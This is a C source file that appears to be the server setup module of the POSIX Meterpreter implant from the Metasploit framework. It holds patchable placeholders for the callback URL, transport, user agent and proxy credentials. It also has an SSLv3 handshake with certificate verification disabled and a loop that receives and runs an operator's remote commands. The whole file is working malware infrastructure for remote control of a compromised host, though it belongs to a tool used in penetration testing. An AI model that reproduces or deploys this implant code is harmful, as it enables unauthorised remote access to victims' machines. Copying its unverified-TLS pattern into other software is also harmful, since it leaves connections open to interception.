/*!
 * @file server_setup.c
 */
#include "metsrv.h"
#include "../common/common.h"

//#define errno 0

char * global_meterpreter_transport = "METERPRETER_TRANSPORT_SSL\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
char * global_meterpreter_url = "https://XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/\x00";
char * global_meterpreter_ua = "METERPRETER_UA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
char * global_meterpreter_proxy = "METERPRETER_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
char * global_meterpreter_proxy_username = "METERPRETER_USERNAME_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
char * global_meterpreter_proxy_password = "METERPRETER_PASSWORD_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
int global_expiration_timeout = 0xb64be661;
int global_comm_timeout       = 0xaf79257f;

#define InitAppInstance()
#define exceptionfilter(a, b)
#define SetHandleInformation(a, b, c)
#define ExitThread(x) exit((x))
const unsigned int hAppInstance = 0x504b5320; // 'PKS '

#define PREPEND_ERROR "### Error: "
#define PREPEND_INFO  "### Info : "
#define PREPEND_WARN  "### Warn : "

/*! @brief This thread is the main server thread. */
static THREAD * serverThread = NULL;

/*! @brief An array of locks for use by OpenSSL. */
static LOCK ** ssl_locks = NULL;

/*!
 * @brief A callback function used by OpenSSL to leverage native system locks.
 * @param mode The lock mode to set.
 * @param type The lock type to operate on.
 * @param file Unused.
 * @param line Unused.
 */
static VOID server_locking_callback(int mode, int type, const char * file, int line)
{
	if (mode & CRYPTO_LOCK)
	{
		lock_acquire(ssl_locks[type]);
	}
	else
	{
		lock_release(ssl_locks[type]);
	}
}

/*!
 * @brief A callback function used by OpenSSL to get the current threads id.
 * @returns The current thread ID.
 * @remarks While not needed on windows this must be used for posix meterpreter.
 */
static DWORD server_threadid_callback(VOID)
{
	return pthread_self();
}

/*
 * Callback function for dynamic lock creation for OpenSSL.
 */
static struct CRYPTO_dynlock_value * server_dynamiclock_create(const char * file, int line)
{
	return (struct CRYPTO_dynlock_value *)lock_create();
}

/*
 * Callback function for dynamic lock locking for OpenSSL.
 */
static void server_dynamiclock_lock( int mode, struct CRYPTO_dynlock_value * l, const char * file, int line )
{
	LOCK * lock = (LOCK *)l;

	if (mode & CRYPTO_LOCK)
	{
		lock_acquire(lock);
	}
	else
	{
		lock_release(lock);
	}
}

/*
 * Callback function for dynamic lock destruction for OpenSSL.
 */
static void server_dynamiclock_destroy( struct CRYPTO_dynlock_value * l, const char * file, int line )
{
	lock_destroy( (LOCK *)l );
}

/*
 * Flush all pending data on the connected socket before doing SSL.
 */
static VOID server_socket_flush( Remote * remote )
{
	fd_set fdread;
	DWORD ret;
	SOCKET fd;
    char buff[4096];

	lock_acquire( remote->lock );

	fd = remote_get_fd(remote);

	while (1) {
		struct timeval tv;
		LONG data;

		FD_ZERO(&fdread);
		FD_SET(fd, &fdread);

		// Wait for up to one second for any errant socket data to appear
		tv.tv_sec  = 1;
		tv.tv_usec = 0;

		data = select((int)fd + 1, &fdread, NULL, NULL, &tv);
		if(data == 0)
			break;

		ret = recv(fd, buff, sizeof(buff), 0);
		printf("[SERVER] Flushed %d bytes from the buffer\n", ret);

		// The socket closed while we waited
		if(ret == 0) {
			break;
		}
		continue;
	}

	lock_release( remote->lock );
}

/*
 * Poll a socket for data to recv and block when none available.
 */
static LONG server_socket_poll( Remote * remote, long timeout )
{
	struct timeval tv;
	LONG result;
	fd_set fdread;
	SOCKET fd;

	lock_acquire( remote->lock );

	fd = remote_get_fd( remote );

	FD_ZERO( &fdread );
	FD_SET( fd, &fdread );

	tv.tv_sec  = 0;
	tv.tv_usec = timeout;

	result = select((int)fd + 1, &fdread, NULL, NULL, &tv );

	// Handle EAGAIN, etc.
	if(result == -1) {
		if(errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK) {
			result = 0;
		}
	}

	lock_release( remote->lock );

	return result;
}

/*
 * Initialize the OpenSSL subsystem for use in a multi threaded enviroment.
 */
static BOOL server_initialize_ssl( Remote * remote )
{
	int i = 0;

	lock_acquire( remote->lock );

	// Begin to bring up the OpenSSL subsystem...
	CRYPTO_malloc_init();
	SSL_load_error_strings();
	SSL_library_init();

	// Setup the required OpenSSL multi-threaded enviroment...
	ssl_locks = (LOCK**)malloc( CRYPTO_num_locks() * sizeof(LOCK *) );
	if( ssl_locks == NULL )
	{
		if (remote->lock)
			lock_release( remote->lock );
		return FALSE;
	}

	for( i=0 ; i<CRYPTO_num_locks() ; i++ )
		ssl_locks[i] = lock_create();

	CRYPTO_set_id_callback( server_threadid_callback );
	CRYPTO_set_locking_callback( server_locking_callback );
	CRYPTO_set_dynlock_create_callback( server_dynamiclock_create );
	CRYPTO_set_dynlock_lock_callback( server_dynamiclock_lock );
	CRYPTO_set_dynlock_destroy_callback( server_dynamiclock_destroy  ); 

	lock_release( remote->lock );

	return TRUE;
}

/*
 * Bring down the OpenSSL subsystem
 */
static BOOL server_destroy_ssl( Remote * remote )
{
	int i = 0;

	if( remote == NULL )
		return FALSE;

	printf("[SERVER] Destroying SSL\n");

	lock_acquire( remote->lock );

	SSL_free( remote->ssl );
	
	SSL_CTX_free( remote->ctx );

	CRYPTO_set_locking_callback( NULL );
	CRYPTO_set_id_callback( NULL );
	CRYPTO_set_dynlock_create_callback( NULL );
	CRYPTO_set_dynlock_lock_callback( NULL );
	CRYPTO_set_dynlock_destroy_callback( NULL );

	for( i=0 ; i<CRYPTO_num_locks() ; i++ )
		lock_destroy( ssl_locks[i] );
		
	free( ssl_locks );

	lock_release( remote->lock );

	return TRUE;
}
/*
 * Negotiate SSL on the socket.
 */
static BOOL server_negotiate_ssl(Remote *remote)
{
	BOOL success = TRUE;
	SOCKET fd    = 0;
	DWORD ret    = 0;
	DWORD res    = 0;

	lock_acquire( remote->lock );

	do
	{
		fd = remote_get_fd(remote);

		remote->meth = SSLv3_client_method();

		remote->ctx  = SSL_CTX_new(remote->meth);
		SSL_CTX_set_mode(remote->ctx, SSL_MODE_AUTO_RETRY);

		remote->ssl  = SSL_new(remote->ctx);
		SSL_set_verify(remote->ssl, SSL_VERIFY_NONE, NULL);
		    
		if( SSL_set_fd(remote->ssl, (int)remote->fd) == 0 )
		{
			printf("[SERVER] set fd failed");
			success = FALSE;
			break;
		}
		
		do {
			if( (ret = SSL_connect(remote->ssl)) != 1 )
			{
				res = SSL_get_error(remote->ssl, ret);
				printf("[SERVER] connect failed %d\n", res);

				if (res == SSL_ERROR_WANT_READ || res == SSL_ERROR_WANT_WRITE) {
					// Catch non-blocking socket errors and retry
					continue;
				}

				success = FALSE;
				break;
			}
		} while(ret != 1);
		
		if (success == FALSE) break;

		printf("[SERVER] Sending a HTTP GET request to the remote side...\n");

		if( (ret = SSL_write(remote->ssl, "GET /123456789 HTTP/1.0\r\n\r\n", 27)) <= 0 )
		{
			printf("[SERVER] SSL write failed during negotiation with return: %d (%d)\n", ret, SSL_get_error(remote->ssl, ret));
		}

	} while(0);

	lock_release( remote->lock );

	printf("[SERVER] Completed writing the HTTP GET request: %d\n", ret);
	
	if( ret < 0 )
		success = FALSE;

	return success;
}

/*!
 * @brief The servers main dispatch loop for incoming requests using SSL over TCP
 * @param remote Pointer to the remote endpoint for this server connection.
 * @returns Indication of success or failure.
 */
static DWORD server_dispatch(Remote * remote)
{
	BOOL running = TRUE;
	LONG result = ERROR_SUCCESS;
	Packet * packet = NULL;
	THREAD * cpt = NULL;

	printf("[DISPATCH] entering server_dispatch( 0x%08X )\n", remote);

	// Bring up the scheduler subsystem.
	result = scheduler_initialize(remote);
	if (result != ERROR_SUCCESS)
	{
		return result;
	}

	while (running)
	{
		if (event_poll(serverThread->sigterm, 0))
		{
			printf("[DISPATCH] server dispatch thread signaled to terminate...\n");
			break;
		}

		result = server_socket_poll(remote, 100);
		if (result > 0)
		{
			result = packet_receive(remote, &packet);
			if (result != ERROR_SUCCESS)
			{
				printf("[DISPATCH] packet_receive returned %d, exiting dispatcher...\n", result);
				break;
			}

			running = command_handle(remote, packet);
			printf("[DISPATCH] command_process result: %s\n", (running ? "continue" : "stop"));
		}
		else if (result < 0)
		{
			printf("[DISPATCH] server_socket_poll returned %d, exiting dispatcher...\n", result);
			break;
		}
	}

	printf("[DISPATCH] calling scheduler_destroy...\n");
	scheduler_destroy();

	printf("[DISPATCH] calling command_join_threads...\n");
	command_join_threads();

	printf("[DISPATCH] leaving server_dispatch.\n");

	return result;
}

/*
 * Get the session id that this meterpreter server is running in.
 */
DWORD server_sessionid( VOID )
{
	return -1;
}
/*
 * Setup and run the server. This is called from Init via the loader.
 */
DWORD server_setup( SOCKET fd )
{
	Remote * remote        = NULL;
	char cStationName[256] = {0};
	char cDesktopName[256] = {0};
	DWORD res              = 0;
	

	printf("[SERVER] Initializing...\n");
	
	int local_error = 0;

	// if hAppInstance is still == NULL it means that we havent been
	// reflectivly loaded so we must patch in the hAppInstance value
	// for use with loading server extensions later.
	InitAppInstance();

	srand( (unsigned int)time(NULL) );
	
	__try 
	{
		do
		{
			printf( "[SERVER] module loaded at 0x%08X\n", hAppInstance );
			
			// Open a THREAD item for the servers main thread, we use this to manage migration later.
			serverThread = thread_open();
			printf( "[SERVER] main server thread: handle=0x%08X id=0x%08X sigterm=0x%08X\n", serverThread->handle, serverThread->id, serverThread->sigterm );


			if( !(remote = remote_allocate(fd)) )
			{
				SetLastError( ERROR_NOT_ENOUGH_MEMORY );
				break;
			}
			
			remote->url = global_meterpreter_url;

			if (strcmp(global_meterpreter_transport+12, "TRANSPORT_SSL") == 0) {
				remote->transport = METERPRETER_TRANSPORT_SSL;
				printf("[SERVER] Using SSL transport...\n");
			} else if (strcmp(global_meterpreter_transport+12, "TRANSPORT_HTTPS") == 0) {
				remote->transport = METERPRETER_TRANSPORT_HTTPS;
				printf("[SERVER] Using HTTPS transport...\n");
			} else if (strcmp(global_meterpreter_transport+12, "TRANSPORT_HTTP") == 0) {
				remote->transport = METERPRETER_TRANSPORT_HTTP;
				printf("[SERVER] Using HTTP transport...\n");
			}


			// Do not allow the file descriptor to be inherited by child processes
			SetHandleInformation((HANDLE)fd, HANDLE_FLAG_INHERIT, 0);

			printf("[SERVER] Initializing tokens...\n");

			// Store our thread handle
			remote->hServerThread = serverThread->handle;
			
			// Process our default SSL-over-TCP transport
			if (remote->transport == METERPRETER_TRANSPORT_SSL) {
				printf("[SERVER] Flushing the socket handle...\n");
				server_socket_flush( remote );
				
				printf("[SERVER] Initializing SSL...\n");
				if( !server_initialize_ssl( remote ) )
					break;
				
				printf("[SERVER] Negotiating SSL...\n");
				if( !server_negotiate_ssl( remote ) )
					break;
				
				printf("[SERVER] Registering dispatch routines...\n");
				register_dispatch_routines();

				
				printf("[SERVER] Entering the main server dispatch loop for transport %d...\n", remote->transport);
				server_dispatch( remote );

				printf("[SERVER] Deregistering dispatch routines...\n");
				deregister_dispatch_routines( remote );
			}

			if (remote->transport == METERPRETER_TRANSPORT_HTTP || remote->transport == METERPRETER_TRANSPORT_HTTPS) {
				printf("[SERVER] Registering dispatch routines...\n");
				register_dispatch_routines();
				
				printf("[SERVER] Entering the main server dispatch loop for transport %d...\n", remote->transport);

				printf("[SERVER] Deregistering dispatch routines...\n");
				deregister_dispatch_routines( remote );
			}

		} while (0);

		if (remote->transport == METERPRETER_TRANSPORT_SSL) {
			printf("[SERVER] Closing down SSL...\n");
			server_destroy_ssl( remote );
		}

		if( remote )
			remote_deallocate( remote );

	} 
	__except( exceptionfilter(GetExceptionCode(), GetExceptionInformation()) )
	{
		printf("[SERVER] *** exception triggered!\n");

		thread_kill( serverThread );
	}

	printf("[SERVER] Finished.\n");
	return res;
}
